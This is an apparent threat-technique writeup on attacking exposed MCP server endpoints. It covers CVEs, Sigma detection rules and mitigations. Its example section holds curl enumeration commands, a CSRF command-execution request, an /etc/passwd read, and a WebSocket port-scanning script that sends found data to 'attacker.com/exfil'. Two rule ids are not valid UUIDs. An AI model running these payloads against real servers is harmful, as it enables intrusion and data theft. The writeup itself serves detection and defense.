# SAFE-T1005: Exposed Endpoint Exploit

## Overview
**Tactic**: Initial Access (ATK-TA0001)
**Technique ID**: SAFE-T1005
**Severity**: Critical
**First Observed**: June 2025 (Backslash Security NeighborJack Research)
**Last Updated**: 2026-01-06

## Description
Exposed Endpoint Exploit is an attack technique where adversaries exploit misconfigured or publicly accessible MCP server endpoints to gain unauthorized access, enumerate available tools, or achieve remote code execution. This technique targets MCP servers that lack proper authentication, are bound to public network interfaces (0.0.0.0), or have debugging features enabled in production environments.

The fundamental vulnerability stems from MCP's design philosophy prioritizing functionality over security. The protocol specification does not mandate authentication, leaving implementation choices to developers who frequently deploy servers without proper access controls. When combined with common misconfigurations such as binding to all network interfaces instead of localhost, these exposed endpoints create a significant attack surface that allows attackers to connect remotely, discover available capabilities, and execute arbitrary commands on the host system.

Security researchers from Backslash Security discovered this widespread issue in June 2025, dubbing it "NeighborJack" due to the prevalence of servers bound to 0.0.0.0 that expose them to any party on the same local network or, without firewall protection, the entire internet.

## Attack Vectors
- **Primary Vector**: Unauthenticated network access to MCP server endpoints lacking authentication controls
- **Secondary Vectors**:
  - Cross-Site Request Forgery (CSRF) attacks targeting localhost-bound services via malicious websites ([Oligo Security, 2025](https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596))
  - DNS rebinding attacks to bypass Same-Origin Policy restrictions
  - WebSocket connection hijacking via port brute-forcing ([Datadog Security Labs, 2025](https://securitylabs.datadoghq.com/articles/claude-mcp-cve-2025-52882/))
  - Man-in-the-middle attacks on insecure HTTP connections ([JFrog Security, 2025](https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/))
  - Internet-wide scanning for exposed MCP services
  - Exploitation of debug mode features left enabled in production

## Technical Details

### Prerequisites
- Target MCP server must be network-accessible (bound to 0.0.0.0 or public IP)
- Server lacks authentication or uses weak/default credentials
- For CSRF attacks: victim must visit attacker-controlled website while MCP server is running
- For WebSocket attacks: knowledge of port range used by target application
- For MITM attacks: network position to intercept unencrypted traffic

### Attack Flow
1. **Reconnaissance Stage**: Attacker scans for exposed MCP endpoints using port scanning, fingerprinting techniques, or internet-wide search engines. Research found approximately 7,000 MCP servers exposed on the web ([Backslash Security, 2025](https://authzed.com/blog/timeline-mcp-breaches)).
2. **Discovery Stage**: Upon identifying an accessible endpoint, attacker connects and issues enumeration commands (`tools/list`, `ping`) to discover available capabilities and server configuration.
3. **Authentication Bypass**: Attacker exploits the lack of authentication to establish unauthorized session. For localhost services, CSRF or DNS rebinding techniques are employed to bypass browser security controls.
4. **Exploitation Stage**: Attacker leverages discovered tools to execute malicious operations—reading sensitive files, executing system commands, or manipulating connected services.
5. **Post-Exploitation**: Attacker establishes persistence, exfiltrates data, or pivots to other systems accessible from the compromised MCP server.

```
┌─────────────────┐     ┌──────────────────┐     ┌─────────────────┐
│    Attacker     │────>│  Exposed MCP     │────>│   Host System   │
│                 │     │  Endpoint        │     │                 │
│ - Port scan     │     │ - No auth        │     │ - File access   │
│ - CSRF attack   │     │ - 0.0.0.0 bound  │     │ - Command exec  │
│ - DNS rebind    │     │ - Debug enabled  │     │ - Cred theft    │
└─────────────────┘     └──────────────────┘     └─────────────────┘
```

### Example Scenario

**Direct endpoint enumeration:**
```bash
# Scan for exposed MCP endpoints
nmap -p 6277,6274,3000-3100 target_ip

# Connect to exposed MCP server and enumerate tools
curl "http://target:6277/sse?transportType=stdio" \
  -H "Accept: text/event-stream"

# Execute tool enumeration
curl -X POST "http://target:6277/message" \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/list","id":1}'
```

**WebSocket port brute-forcing (CVE-2025-52882):**
```javascript
// Malicious JavaScript scanning for MCP WebSocket servers
async function scanForMCPServer() {
    for (let port = 3000; port < 3100; port++) {
        try {
            const ws = new WebSocket(`ws://localhost:${port}`);
            ws.onopen = () => {
                // Found MCP server, send enumeration command
                ws.send(JSON.stringify({
                    jsonrpc: "2.0",
                    method: "tools/list",
                    id: 1
                }));
            };
            ws.onmessage = (event) => {
                // Exfiltrate discovered tools to attacker server
                fetch('https://attacker.com/exfil', {
                    method: 'POST',
                    body: event.data
                });
            };
        } catch (e) { continue; }
    }
}
```

**CSRF exploitation via 0.0.0.0-day (CVE-2025-49596):**
```javascript
// Exploit 0.0.0.0 binding to execute commands via CSRF
fetch("http://0.0.0.0:6277/sse?transportType=stdio&command=id&args=", {
    method: "GET",
    mode: "no-cors",
    credentials: "omit"
});
```

**File extraction from exposed agent (IONIX Research):**
```bash
# Leveraging exposed browser automation tool
curl -X POST "http://exposed-mcp:8080/trigger_task" \
  -H "Content-Type: application/json" \
  -d '{
    "task": "navigate to file:///etc/passwd and return contents",
    "browser_type": "chromium",
    "llm_model_type": "default"
  }'
```

### Advanced Attack Techniques (2025 Research)

According to multiple security research teams, attackers have developed sophisticated variations exploiting exposed MCP endpoints:

1. **NeighborJack Attack** ([Backslash Security, June 2025](https://authzed.com/blog/timeline-mcp-breaches)): Exploits MCP servers bound to 0.0.0.0 instead of localhost. Researchers discovered hundreds of servers configured this way, exposing them to local network attackers without requiring any authentication bypass. The attack enables complete control over host systems through OS command injection.

2. **0.0.0.0-Day Browser Exploitation** ([Oligo Security, 2025](https://www.oligo.security/blog/0-0-0-0-day-exploiting-localhost-apis-from-the-browser)): Leverages a 19-year-old browser security flaw where requests to 0.0.0.0 are treated as localhost but bypass Same-Origin Policy restrictions. Attackers craft malicious websites that send requests to victim's local MCP services, achieving RCE simply by having the victim visit a webpage.

3. **WebSocket Brute-Force Discovery** ([Datadog Security Labs, 2025](https://securitylabs.datadoghq.com/articles/claude-mcp-cve-2025-52882/)): Scripts systematically attempt WebSocket connections across common port ranges to discover running MCP servers. Once discovered, the lack of authentication allows immediate command execution including file reads and tool invocations.

4. **Session ID Prediction** ([JFrog Security - CVE-2025-6515](https://www.theregister.com/2025/10/21/mcp_prompt_hijacking_attack/)): Exploits predictable session ID generation in MCP implementations to hijack active sessions. Attackers rapidly create and destroy sessions, log the IDs, and wait for reassignment to legitimate client sessions.

5. **Internet-Wide Exposure Scanning**: Researchers from multiple organizations have conducted internet-wide scans finding thousands of exposed MCP endpoints. IONIX researchers demonstrated exploitation of publicly exposed browser automation agents to extract sensitive files from host systems ([IONIX, 2025](https://www.ionix.io/blog/exposed-ai-agents-in-the-wild-public-mcp-server-security-exposed/)).

## Impact Assessment
- **Confidentiality**: High - Attackers can read sensitive files, environment variables, credentials, and API keys through exposed tools
- **Integrity**: High - Ability to execute arbitrary commands, modify files, and manipulate connected services
- **Availability**: High - Can disrupt services, cause denial of service, or consume resources through denial-of-wallet attacks
- **Scope**: Network-wide - Compromised MCP servers often have access to internal networks, databases, and cloud services enabling lateral movement

### Current Status (2025-2026)

Multiple critical CVEs have been issued and patched:

| CVE | Component | CVSS | Status | Fix Version |
|-----|-----------|------|--------|-------------|
| CVE-2025-49596 | MCP Inspector | 9.4 | Patched | 0.14.1 |
| CVE-2025-52882 | Claude Code Extensions | 8.8 | Patched | 1.0.24 |
| CVE-2025-6514 | mcp-remote | 9.6 | Patched | 0.1.16 |
| CVE-2025-6515 | oatpp-mcp | - | Patched | - |
| CVE-2025-53109 | Various | 8.4 | Patched | - |
| CVE-2025-53110 | Various | 7.3 | Patched | - |

Despite patches, the ecosystem remains at risk due to:
- Slow adoption of updates in enterprise environments
- Forked repositories containing vulnerable code (5,000+ forks of vulnerable Anthropic SQLite server)
- New MCP servers launched without security review (13,000+ in 2025 alone)
- Protocol specification still not mandating authentication

### Real-World Incidents

**Asana Privacy Breach (June 2025)**: Following deployment of an MCP-powered feature, Asana discovered a bug causing customer information to leak between different customers' MCP instances due to improper endpoint isolation.

**Smithery Registry Exploit (2025)**: Security researchers discovered a path-traversal vulnerability in Smithery's MCP server registry that allowed attackers to exfiltrate builder credentials including Docker config and Fly.io API tokens, potentially affecting over 3,000 applications.

## Detection Methods

### Indicators of Compromise (IoCs)
- Unexpected network connections to MCP default ports (6277, 6274, 3000-3100)
- MCP server processes spawning unusual child processes
- `tools/list` or enumeration requests from external IP addresses
- High volume of WebSocket connection attempts across port ranges
- Requests containing `transportType=stdio&command=` parameters
- MCP services bound to 0.0.0.0 instead of 127.0.0.1
- Suspicious file access patterns from MCP server processes (/etc/passwd, .env, credentials)
- Outbound connections from MCP processes to unknown external hosts

### Detection Rules

**Important**: The following rules are written in Sigma format and contain example patterns only. Attackers continuously develop new techniques to bypass detection. Organizations should:
- Use network traffic analysis to identify unauthorized MCP access
- Monitor process creation from MCP server processes
- Implement anomaly detection for unusual tool invocations
- Regularly audit network bindings of MCP services

```yaml
# EXAMPLE SIGMA RULE - Exposed MCP Endpoint Access Detection
title: Exposed MCP Endpoint Unauthorized Access Attempt
id: b8e2f147-3c6d-4a82-9e5b-2f1d3c4a8b7e
status: experimental
description: Detects potential unauthorized access to exposed MCP server endpoints
author: Raju Kumar Yadav
date: 2026-01-06
references:
  - https://github.com/safe-mcp/techniques/SAFE-T1005
  - https://nvd.nist.gov/vuln/detail/CVE-2025-49596
  - https://nvd.nist.gov/vuln/detail/CVE-2025-52882
logsource:
  product: webserver
  service: access
detection:
  selection_mcp_endpoints:
    c-uri-path|contains:
      - '/sse'
      - '/message'
      - '/tools/list'
      - '/tools/call'
  selection_suspicious_params:
    c-uri-query|contains:
      - 'transportType=stdio'
      - 'command='
      - 'jsonrpc'
  selection_external_source:
    c-ip|not startswith:
      - '127.'
      - '10.'
      - '192.168.'
      - '172.16.'
      - '172.17.'
      - '172.18.'
      - '172.19.'
      - '172.20.'
      - '172.21.'
      - '172.22.'
      - '172.23.'
      - '172.24.'
      - '172.25.'
      - '172.26.'
      - '172.27.'
      - '172.28.'
      - '172.29.'
      - '172.30.'
      - '172.31.'
  condition: selection_mcp_endpoints and (selection_suspicious_params or selection_external_source)
falsepositives:
  - Legitimate remote MCP administration
  - Authorized security testing
  - Distributed MCP deployments with proper authentication
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - safe.t1005
```

```yaml
# EXAMPLE SIGMA RULE - MCP Server Misconfiguration Detection
title: MCP Server Bound to All Interfaces (NeighborJack Risk)
id: c9f3e258-4d7e-5b93-0f6c-3g2e4d5b9c8f
status: experimental
description: Detects MCP servers potentially exposed via 0.0.0.0 binding
author: Raju Kumar Yadav
date: 2026-01-06
references:
  - https://github.com/safe-mcp/techniques/SAFE-T1005
logsource:
  product: linux
  service: auditd
detection:
  selection_mcp_process:
    process.name|contains:
      - 'mcp'
      - 'inspector'
      - 'node'
  selection_network_bind:
    socket.addr: '0.0.0.0'
    socket.port|in:
      - 6277
      - 6274
      - 3000
      - 3001
      - 8080
  condition: selection_mcp_process and selection_network_bind
falsepositives:
  - Intentionally exposed services with proper authentication
  - Container orchestration environments
level: medium
tags:
  - attack.initial_access
  - safe.t1005
```

```yaml
# EXAMPLE SIGMA RULE - WebSocket Port Scanning Detection
title: WebSocket Port Scanning for MCP Server Discovery
id: d0g4f369-5e8f-6c04-1g7d-4h3f5e6c0d9g
status: experimental
description: Detects rapid WebSocket connection attempts indicative of MCP server discovery
author: Raju Kumar Yadav
date: 2026-01-06
references:
  - https://github.com/safe-mcp/techniques/SAFE-T1005
  - https://securitylabs.datadoghq.com/articles/claude-mcp-cve-2025-52882/
logsource:
  product: network
  service: firewall
detection:
  selection:
    dst_port|range: 3000-3100
    protocol: tcp
  timeframe: 60s
  condition: selection | count() by src_ip > 20
falsepositives:
  - Legitimate network scanning
  - Load balancer health checks
level: high
tags:
  - attack.discovery
  - attack.t1046
  - safe.t1005
```

### Behavioral Indicators
- MCP server processes binding to 0.0.0.0 instead of 127.0.0.1
- Unexpected `tools/list` or capability enumeration requests
- File read operations targeting sensitive paths (/etc/passwd, .env, ~/.aws/credentials)
- Outbound network connections from MCP processes during unusual hours
- High frequency of session creation/destruction (session ID harvesting)
- Browser-initiated requests to localhost MCP ports from untrusted origins

## Mitigation Strategies

### Preventive Controls
1. **Network Binding Restrictions**: Configure all MCP servers to bind exclusively to localhost (127.0.0.1) rather than all interfaces (0.0.0.0). According to [Backslash Security research](https://authzed.com/blog/timeline-mcp-breaches), this single configuration change eliminates the NeighborJack attack vector.

2. **Authentication Controls**: Implement mandatory authentication for all MCP endpoints. Use session tokens stored in local lock files and verified on each connection, as implemented in the CVE-2025-52882 fix ([Datadog Security Labs](https://securitylabs.datadoghq.com/articles/claude-mcp-cve-2025-52882/)).

3. **Firewall Rules**: Block external access to MCP ports (6277, 6274, and custom ports) at the network perimeter. Implement host-based firewalls to restrict access to localhost only.

4. **Version Management**: Maintain updated versions of all MCP components. Critical patches include MCP Inspector 0.14.1+, Claude Code Extensions 1.0.24+, and mcp-remote 0.1.16+.

5. **Browser Security**: Implement CORS restrictions and origin validation to prevent CSRF attacks. The CVE-2025-49596 fix added trusted origin restrictions to mitigate browser-based exploits.

6. **Disable Debug Mode in Production**: Ensure debugging features, verbose logging, and development endpoints are disabled in production deployments.

7. **Use HTTPS/TLS**: Always use encrypted connections (wss://, https://) for MCP communications to prevent man-in-the-middle attacks, especially for mcp-remote connections ([JFrog Security recommendation](https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/)).

### Detective Controls
1. **Process Monitoring**: Monitor for unusual child processes spawned by MCP servers, particularly shell commands, file operations, or network utilities.

2. **Network Monitoring**: Implement network traffic analysis to detect unauthorized access attempts, WebSocket port scanning, and suspicious enumeration patterns.

3. **HTTP Request Analysis**: Log and analyze all requests to MCP endpoints, flagging enumeration attempts, command injection patterns, and access from unexpected sources.

4. **Audit Network Bindings**: Regularly audit running MCP services to ensure they are not inadvertently bound to public interfaces.

### Response Procedures
1. **Immediate Actions**:
   - Isolate affected MCP server from network immediately
   - Kill all MCP-related processes on compromised hosts
   - Block identified attacker IP addresses at firewall
   - Revoke and rotate all credentials accessible from the MCP server
   - Disable any exposed debugging endpoints

2. **Investigation Steps**:
   - Review access logs for unauthorized connection attempts
   - Analyze process creation logs for evidence of command execution
   - Check for data exfiltration via network traffic analysis
   - Identify scope of potential credential compromise
   - Determine if lateral movement occurred to other systems
   - Review audit logs for file access patterns

3. **Remediation**:
   - Rebuild compromised systems from known-good backups
   - Update all MCP components to patched versions
   - Reconfigure network bindings to localhost only
   - Implement authentication on all MCP endpoints
   - Deploy network segmentation to isolate MCP services
   - Rotate all potentially exposed credentials and API keys
   - Conduct security review of all MCP server configurations

## Related Techniques
- [SAFE-T1109](../SAFE-T1109/README.md): Debugging Tool Exploitation - Shares exploitation of 0.0.0.0 binding and CSRF vectors
- [SAFE-T1601](../SAFE-T1601/README.md): MCP Server Enumeration - Often follows initial endpoint access
- [SAFE-T1602](../SAFE-T1602/README.md): Tool Enumeration - Primary reconnaissance activity after gaining access
- [SAFE-T1001](../SAFE-T1001/README.md): Tool Poisoning Attack - Can be combined with exposed endpoint access
- [SAFE-T1101](../SAFE-T1101/README.md): Command Injection - Common exploitation technique after endpoint access
- [SAFE-T1910](../SAFE-T1910/README.md): Covert Channel Exfiltration - Data exfiltration following compromise

## References
- [CVE-2025-49596 - NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-49596)
- [CVE-2025-52882 - NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-52882)
- [CVE-2025-6514 - NIST NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-6514)
- [CVE-2025-52882: WebSocket authentication bypass in Claude Code extensions - Datadog Security Labs](https://securitylabs.datadoghq.com/articles/claude-mcp-cve-2025-52882/)
- [Critical RCE in Anthropic MCP Inspector (CVE-2025-49596) Enables Browser-Based Exploits - Oligo Security](https://www.oligo.security/blog/critical-rce-vulnerability-in-anthropic-mcp-inspector-cve-2025-49596)
- [Critical RCE Vulnerability in mcp-remote: CVE-2025-6514 Threatens LLM Clients - JFrog Security](https://jfrog.com/blog/2025-6514-critical-mcp-remote-rce-vulnerability/)
- [Exposed AI Agents in the Wild: How a Public MCP Server Let Us Peek Inside Its Host - IONIX](https://www.ionix.io/blog/exposed-ai-agents-in-the-wild-public-mcp-server-security-exposed/)
- [A Timeline of Model Context Protocol (MCP) Security Breaches - AuthZed](https://authzed.com/blog/timeline-mcp-breaches)
- [Model Context Protocol Security: Critical Vulnerabilities Every CISO Should Address in 2025 - eSentire](https://www.esentire.com/blog/model-context-protocol-security-critical-vulnerabilities-every-ciso-should-address-in-2025)
- [MCP (Model Context Protocol) and Its Critical Vulnerabilities - Strobes Security](https://strobes.co/blog/mcp-model-context-protocol-and-its-critical-vulnerabilities/)
- [MCP: Untrusted Servers and Confused Clients, Plus a Sneaky Exploit - Embrace The Red](https://embracethered.com/blog/posts/2025/model-context-protocol-security-risks-and-exploits/)
- [MCP Security: TOP 25 MCP Vulnerabilities - Adversa AI](https://adversa.ai/mcp-security-top-25-mcp-vulnerabilities/)
- [0.0.0.0-Day: Exploiting Localhost APIs from the Browser - Oligo Security](https://www.oligo.security/blog/0-0-0-0-day-exploiting-localhost-apis-from-the-browser)
- [MCP attack abuses predictable session IDs to hijack AI agents - The Register](https://www.theregister.com/2025/10/21/mcp_prompt_hijacking_attack/)
- [Model Context Protocol Specification](https://modelcontextprotocol.io/specification)
- [OWASP Top 10 for LLM Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/)

## MITRE ATT&CK Mapping
- [T1190 - Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [T1133 - External Remote Services](https://attack.mitre.org/techniques/T1133/)
- [T1046 - Network Service Discovery](https://attack.mitre.org/techniques/T1046/)
- [T1087 - Account Discovery](https://attack.mitre.org/techniques/T1087/)
- [T1059 - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)

## Version History
| Version | Date | Changes | Author |
|---------|------|---------|--------|
| 1.0 | 2026-01-06 | Initial documentation with CVE analysis and research compilation | Raju Kumar Yadav |
